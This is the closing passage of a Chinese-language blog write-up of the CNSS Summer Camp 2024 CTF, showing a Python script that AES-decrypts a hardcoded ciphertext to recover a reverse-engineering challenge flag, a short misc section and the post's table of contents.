class="number">48</span>) &gt;&gt; <span class="number">4</span>))) + \</span><br><span class="line">        <span class="built_in">chr</span>(((a2 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | ((a3 &amp; <span class="number">60</span>) &gt;&gt; <span class="number">2</span>)) + \</span><br><span class="line">        <span class="built_in">chr</span>(((a3 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | a4)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qvq</span>(<span class="params">key_str</span>):</span><br><span class="line">    cipher_text = b64decode(<span class="string">&quot;11VaDwVeOwKvL6eqb2hsA2rb0wTbTRwsb7WirGpBW8s=&quot;</span>)</span><br><span class="line">    key = key_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;I am CNSS AESkey&quot;</span></span><br><span class="line"></span><br><span class="line">decrypted_message = qvq(key)</span><br><span class="line"><span class="built_in">print</span>(decrypted_message)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">cnss&#123;We1c0Me t0 Andorid Rev!&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h1 id="ğŸ§©Misc"><a href="#ğŸ§©Misc" class="headerlink" title="ğŸ§©Misc"></a>ğŸ§©Misc</h1><p>æ²¡æ€ä¹ˆåšï¼Œä¹Ÿåšä¸å‡ºæ¥ï¼Œç¬‘æ­»ã€‚åšå‡ºä¸€é“éŸ³é¢‘éšå†™è¿˜æœ‰ä¸€é“Wordæ–‡æ¡£æŸ¥æ—¶é—´çš„é¢˜ã€‚</p>
<p>å¾ˆæœ‰è¶£çš„ä¸€æ¬¡ç»å†ï¼Œè®°å½•ä¸€ä¸‹ï¼Œå˜»å˜»&gt;.&lt;</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>CNSS Summer-Camp 2024 wp</p><p><a href="http://aununo.xyz/2024/08/07/CNSS-Summer-Camp-2024 wp/">http://aununo.xyz/2024/08/07/CNSS-Summer-Camp-2024 wp/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Aununo Gan</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2024-08-07</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i> </a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i> </a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i> </a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i>Â <a class="link-muted" rel="tag" href="/tags/CNSS/">CNSS,Â </a><a class="link-muted" rel="tag" href="/tags/CTF/">CTF </a></div></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="https://pic1.imgdb.cn/item/6810a12858cb8da5c8d45496.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2024/09/30/CNSS%20Recruit%202024%20Dev%20wp/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CNSS Recruit 2024 Dev wp</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2024/07/21/Windows-Subsystem-for-Linux/"><span class="level-item">Windows Subsystem for Linux</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level" style="margin-bottom:1rem"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="Aununo"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Aununo</p><p class="is-size-6 is-block">Identity follows your actions.</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Chengdu, China</span></p></div></div></nav><nav class="level menu-list is-mobile" style="margin-bottom:1rem"><a class="level-item has-text-centered is-marginless" href="/archives/"><div><p class="heading">Posts</p><div><p class="title">5</p></div></div></a><a class="level-item has-text-centered is-marginless" href="/categories/"><div><p class="heading">Categories</p><div><p class="title">3</p></div></div></a><a class="level-item has-text-centered is-marginless" href="/tags/"><div><p class="heading">Tags</p><div><p class="title">10</p></div></div></a></nav><div class="level"><a class="level-item button is-primary is-rounded" href="mailto:ganrunzhuo@gmail.com" target="_blank" rel="noopener"><i class="fas fa-envelope"></i>Â Â Email Me</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/Aununo"><i class="fab fa-github"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#ğŸ”¢Crypto"><span class="level-left"><span class="level-item">1</span><span class="level-item">ğŸ”¢Crypto</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ğŸ”®cnsså¨˜çš„è°œè¯­"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">ğŸ”®cnsså¨˜çš„è°œè¯­</span></span></a></li><li><a class="level is-mobile" href="#ğŸ¬æ°´é¾™åŸ"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">ğŸ¬æ°´é¾™åŸ</span></span></a></li><li><a class="level is-mobile" href="#ğŸŒ”åœç®—å­"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">ğŸŒ”åœç®—å­</span></span></a></li><li><a class="level is-mobile" href="#ğŸ Fun-factoring"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">ğŸ Fun_factoring</span></span></a></li><li><a class="level is-mobile" href="#ğŸ¦¢BabyCurve"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">ğŸ¦¢BabyCurve</span></span></a></li><li><a class="level is-mobile" href="#ğŸ”‘Small-private-key"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">ğŸ”‘Small private key</span></span></a></li><li><a class="level is-mobile" href="#ğŸ¿ï¸ç‰©ä¸çŸ¥æ•°"><span class="level-left"><span class="level-item">1.7</span><span class="level-item">ğŸ¿ï¸ç‰©ä¸çŸ¥æ•°</span></span></a></li><li><a class="level is-mobile" href="#âš’ï¸é“œåŒ çš„è‰ºæœ¯â…¡"><span class="level-left"><span class="level-item">1.8</span><span class="level-item">âš’ï¸é“œåŒ çš„è‰ºæœ¯â…¡</span></span></a></li><li><a class="level is-mobile" href="#â›ï¸é“œåŒ çš„è‰ºæœ¯â… "><span class="level-left"><span class="level-item">1.9</span><span class="level-item">â›ï¸é“œåŒ çš„è‰ºæœ¯â… </span></span></a></li><li><a class="level is-mobile" href="#ğŸ˜‹å’æ˜¯æ¬§å‡ é‡Œå¾—"><span class="level-left"><span class="level-item">1.10</span><span class="level-item">ğŸ˜‹å’æ˜¯æ¬§å‡ é‡Œå¾—</span></span></a></li><li><a class="level is-mobile" href="#âš½Permutation"><span class="level-left"><span class="level-item">1.11</span><span class="level-item">âš½Permutation</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ğŸ•¸ï¸Web"><span class="level-left"><span class="level-item">2</span><span class="level-item">ğŸ•¸ï¸Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ğŸ¦´babyHTTP"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">ğŸ¦´babyHTTP</span></span></a></li><li><a class="level is-mobile" href="#ğŸ™‹ğŸ¼â€â™€ï¸PHPinfo"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">ğŸ™‹ğŸ¼â€â™€ï¸PHPinfo</span></span></a></li><li><a class="level is-mobile" href="#ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹</span></span></a></li><li><a class="level is-mobile" href="#ğŸ“Ping"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">ğŸ“Ping</span></span></a></li><li><a class="level is-mobile" href="#ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—</span></span></a></li><li><a class="level is-mobile" href="#ğŸ®2048"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">ğŸ®2048</span></span></a></li><li><a class="level is-mobile" href="#ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆ"><span class="level-left"><span class="level-item">2.7</span><span class="level-item">ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆ</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ğŸ’¥Pwn"><span class="level-left"><span class="level-item">3</span><span class="level-item">ğŸ’¥Pwn</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ğŸ˜¯nc-nc"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">ğŸ˜¯nc? nc!</span></span></a></li><li><a class="level is-mobile" href="#ğŸ¤–Bot"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">ğŸ¤–Bot</span></span></a></li><li><a class="level is-mobile" href="#ğŸ’“Overflow-Me"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">ğŸ’“Overflow Me</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ğŸ”Reverse"><span class="level-left"><span class="level-item">4</span><span class="level-item">ğŸ”Reverse</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ğŸ˜é‚£ä¸ªå¥³äºº"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">ğŸ˜é‚£ä¸ªå¥³äºº</span></span></a></li><li><a class="level is-mobile" href="#ğŸ˜­æˆ‘çš„flagç¢äº†ä¸€åœ°"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">ğŸ˜­æˆ‘çš„flagç¢äº†ä¸€åœ°</span></span></a></li><li><a class="level is-mobile" href="#âœˆï¸æ‰“é£æœºé«˜æ‰‹"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">âœˆï¸æ‰“é£æœºé«˜æ‰‹</span></span></a></li><li><a class="level is-mobile" href="#â™¾ï¸äº¦çœŸäº¦æˆ–äº¦å‡"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">â™¾ï¸äº¦çœŸäº¦æˆ–äº¦å‡</span></span></a></li><li><a class="level is-mobile" href="#ğŸµèŒ¶æ¯å¤´å¤§å†’é™©"><span class="level-left"><span class="level-item">4.5</span><span class="level-item">ğŸµèŒ¶æ¯å¤´å¤§å†’é™©</span></span></a></li><li><a class="level is-mobile" href="#ğŸ’¥çˆ†äº†çˆ†äº†ï¼Œå’Œ-JAVA-çˆ†äº†"><span class="level-left"><span class="level-item">4.6</span><span class="level-item">ğŸ’¥çˆ†äº†çˆ†äº†ï¼Œå’Œ JAVA çˆ†äº†</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ğŸ§©Misc"><span class="level-left"><span class="level-item">5</span><span class="level-item">ğŸ§©Misc</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Aununo&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 Aununo Gan</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">Â© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>